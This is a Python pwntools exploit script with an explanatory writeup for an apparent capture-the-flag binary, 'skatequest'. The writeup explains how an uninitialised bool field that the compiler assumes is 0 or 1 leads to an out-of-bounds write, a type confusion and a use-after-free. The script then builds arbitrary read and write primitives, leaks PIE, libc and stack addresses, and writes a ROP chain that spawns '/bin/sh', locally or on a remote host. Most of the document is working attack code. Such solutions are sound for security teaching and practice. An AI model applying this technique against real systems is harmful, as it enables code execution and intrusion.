#!/usr/bin/env python3

'''
    Writeup:
    The hardest part of this challenge is spotting the original bug, and 
    understanding the initial primitive it gives you. The bug is that 
    BadGuy field isBoss is only conditionally initialised:
        ```
            if ((i-1)%4 == 0) m->makeBoss();
        ```
    Therefore, it is possible to groom uninitialised data into the field.
    This is clearly a bug (a BadGuy can be made a boss when they shouldn't be)
    but in this case it is exploitable for the following reason:

    Under -O2, the following statement:

    ```
        (monster->isBoss
            ? ledger[ledgerCount++]
            : ordinarySlain) = monster;
    ```
    compiles to:
    ```
    ...
   0x0000555555557172 <+98>:	movzx  ecx,BYTE PTR [rdi+0x3c]
   0x0000555555557176 <+102>:	lea    rdx,[rbx+rsi*8]
   0x000055555555717a <+106>:	add    rsi,rcx
   0x000055555555717d <+109>:	test   rcx,rcx
   0x0000555555557180 <+112>:	cmove  rdx,r15
    ...
    ```
    Weird! The value of the boolean field is unconditionally added to `ledgerCount`. 
    This happens because the compiler strongly assumes that the value of a std::bool 
    is always 0 or 1, so in the context of the ternary statement above, this lowering
    is valid. However if we violate that invariant, it is no longer a safe assumption
    and it allows us to achieve an out-of-bound write. 

    
    Exploitation:

    By grooming a value that is not 0 or 1 into the isBoss field of a BadGuy, we can
    cause a BadGuy to be written out of bounds in the `ledger`. 


    The Game class looks like:

        
    class Game {
    public:
        BadGuy* ledger[kLedgerSlots];
        BadGuy* ordinarySlain;
        int ledgerEntries;

        Player player;
        std::vector<BadGuy*> monsters;
        int bossesRequired;
        int round;


    So by writing a BadGuy out of bounds into the Player member, we can achieve the following:
    Write a BadGuy over the xp/gold of the player. This provides a heap leak, and
    additionally raises the player gold.

    Then the next out of bounds write to the ledger will write a BadGuy pointer into the
    player's inventory, providing a type confusion. This type confusion allows us to 
    free a BadGuy, but it will still be referenced in the monster vector, effectively
    leading to a UAF condition. 

    From here, we can use our high gold to buy the SprayCan item. 
    This item lets us rename objects, giving us a way to reclaim the freed BadGuy with 
    a controlled content buffer.

    Now, we reclaim the freed BadGuy by using the spraycan to rename itself, which allocates
    a buffer we control. We create a fake Item (specifically, forging a string within the fake item body)
    while making sure that, interpreted as a BadGuy, the chunk still has hp == 0 and isBoss == 2.

    This means that the next time ShowScore is called, our fake item is written back into the 
    inventory. We can now read and write freely: using the spray can lists all item names 
    (which prints the data at our fake string pointer), and using the spraycan to rename
    the fake item lets us write. Renaming the spraycan itself allows us to point the fake
    string in the fake item to whatever memory we want.

    From here: leak exe from a vtable, libc from the exe, stack from libc, and write a rop chain to stack.

'''



import os
import sys

from pwn import *

exe = context.binary = ELF("./skatequest")
libc = ELF("libc.so.6")

ld_path = "./ld.so"
ld = ELF(ld_path, checksec=False)
context.log_level = "info"

def local_process():
    library_path = os.environ.get("SKATEQUEST_LIBRARY_PATH", ".")
    return process([
        ld.path,
        "--library-path",
        library_path,
        exe.path,
    ])


def start():
    argv = sys.argv[1:]

    if args.GDB or (argv and argv[0].lower() in ("debug", "gdb")):
        if os.environ.get("TMUX"):
            context.terminal = ["tmux", "split-window", "-h"]
        p = local_process()
        gdb.attach(p)
        return p

    if not argv or argv[0].lower() == "local":
        return local_process()

    if argv[0].lower() == "remote":
        argv = argv[1:]

    if len(argv) == 2:
        host, port = argv
    elif len(argv) == 1 and ":" in argv[0]:
        host, port = argv[0].rsplit(":", 1)
    else:
        log.error(
            f"usage: {sys.argv[0]} [local|debug|gdb|GDB|remote HOST PORT|HOST:PORT]"
        )

    return remote(host, int(port))

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))


p = start()


def choose(value):
    sla(b"> ", str(value).encode())


def reject_name(payload):
    sla(b"What is your name, adventurer? ", payload)
    sla(b"(y/n) ", b"n")


def fight(attacks):
    for _ in range(attacks):
        choose(1)


def forged_item(target, length, capacity):
    payload = bytearray(b"A" * 59)

    payload[0x28:0x2c] = p32(0)
    payload[0x08:0x10] = p64(target)
    payload[0x10:0x18] = p64(length)
    payload[0x18:0x20] = p64(capacity)
    result = bytes(payload)
    return result


def use_spray(first_length, second_length, target_slot, new_label):
    choose(2)
    sla(b"Which item? >", b"2")

    ru(b"Choose an item to repaint:\n  1) ")
    first = p.recvn(first_length)
    ru(b"\n  2) ")
    second = p.recvn(second_length)
    ru(b"\n")

    sla(b"Which item? >", str(target_slot).encode())
    sla(b"New label: ", new_label)
    return first, second


m2_seed = bytearray(b"M" * 63)
m2_seed[0x3c] = 2
reject_name(bytes(m2_seed))

m0_seed = bytearray(b"L" * 63)
m0_seed[0x3c] = 7
reject_name(bytes(m0_seed))

sla(b"What is your name, adventurer? ", b"bob")
sla(b"(y/n) ", b"y")
choose(3)

choose(2)
choose(3)
choose(1)
choose(8)

choose(1)
choose(2)
sla(b"Which item? >", b"2")
choose(4)

choose(4)
fight(2)

choose(4)
fight(3)

choose(4)
choose(2)
sla(b"Which item? ", b"3")
fight(4)

choose(3)


ru(b"XP")

leaks = p.recvline().split()

xp = int(leaks[0])
gold = int(leaks[2])


m1 = ((gold & 0xFFFFFFFF) << 32) | (xp & 0xFFFFFFFF)

log.success(f"m1 heap pointer: {m1:#x}")

choose(1) 
choose(3)
sla(b"Which item? >", b"1")
choose(4)

choose(2)
choose(7)
choose(8)

choose(1)
initial = forged_item(m1, 8, 8)
first, second = use_spray(
    len(b"Tennis Ball"), len(b"Spray Can"), 2, initial
)
choose(4)

choose(3)
choose(1)

owner_label = initial
fake_length = 8


def read_fake():
    first, second = use_spray(fake_length, len(owner_label), 2, owner_label)
    return first

badguy_vtable_offset = exe.sym["_ZTV6BadGuy"]
badguy_vptr = u64(read_fake())
exe.address = badguy_vptr - (badguy_vtable_offset + 16)
log.success(f"BadGuy vptr: {badguy_vptr:#x}")
log.success(f"PIE base: {exe.address:#x}")


def retarget(address, length, capacity=None):
    global fake_length, owner_label
    if capacity is None:
        capacity = length
    replacement = forged_item(address, length, capacity)
    _, previous_owner = use_spray(
        fake_length, len(owner_label), 2, replacement
    )
    fake_length = length
    owner_label = replacement


def arb_read(address, size):
    retarget(address, size)
    return read_fake()


def arb_write(address, data):
    global fake_length, owner_label
    retarget(address, 0, len(data))
    _, current_owner = use_spray(0, len(owner_label), 1, data)

    fake_length = len(data)
    owner_label = forged_item(address, len(data), len(data))


libc_start_main = u64(arb_read(exe.got["__libc_start_main"], 8))
libc.address = libc_start_main - libc.sym["__libc_start_main"]
log.success(f"__libc_start_main: {libc_start_main:#x}")
log.success(f"libc base: {libc.address:#x}")


stack_pointer = u64(arb_read(libc.sym["program_invocation_name"] + 0x1000, 8))
log.success(f"argv[0] stack pointer: {stack_pointer:#x}")

camp = exe.sym["_ZN4Game4campEv"]
open_inventory = exe.sym["_ZN4Game13openInventoryEv"]
camp_code = exe.read(camp, open_inventory - camp)
return_sites = []
for offset in range(len(camp_code) - 4):
    if camp_code[offset] != 0xE8:
        continue
    displacement = int.from_bytes(
        camp_code[offset + 1:offset + 5], "little", signed=True
    )
    if camp + offset + 5 + displacement == open_inventory:
        return_sites.append(camp + offset + 5)
if len(return_sites) != 1:
    log.error(f"could not identify camp's inventory call: {return_sites!r}")
return_to_camp = return_sites[0]

saved_rips = []
address = (stack_pointer - 0x40) & ~0x3f
scan_limit = stack_pointer - 0x4000
while address >= scan_limit:
    words = unpack_many(arb_read(address, 64))
    for index, value in enumerate(words):
        if value == return_to_camp:
            saved_rips.append(address + index * 8)
    if saved_rips:
        break
    address -= 0x40

saved_rip = saved_rips[0]
log.success(f"openInventory saved RIP: {saved_rip:#x}")

exe_rop = ROP(exe)
ret = exe_rop.find_gadget(["ret"]).address
pop_rdi = exe_rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = saved_rip + 4 * 8
chain = flat(
    ret,
    pop_rdi, bin_sh, libc.sym["system"],
    b"/bin/sh\0",
)

arb_write(saved_rip, chain)

choose(4)
p.interactive()
